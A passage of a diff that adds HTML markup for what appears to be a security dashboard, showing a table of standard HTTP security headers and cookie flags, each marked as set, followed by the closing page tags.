+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+              <tr>
+                <td>X-Content-Type-Options</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">nosniff</td>
+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+              <tr>
+                <td>Strict-Transport-Security</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">max-age=31536000; includeSubDomains
+                </td>
+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+              <tr>
+                <td>Referrer-Policy</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">strict-origin-when-cross-origin</td>
+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+              <tr>
+                <td>Permissions-Policy</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">camera=(), microphone=(),
+                  geolocation=()</td>
+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+              <tr>
+                <td>Set-Cookie Flags</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">HttpOnly; Secure; SameSite=Strict</td>
+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</body>
+
+</html>
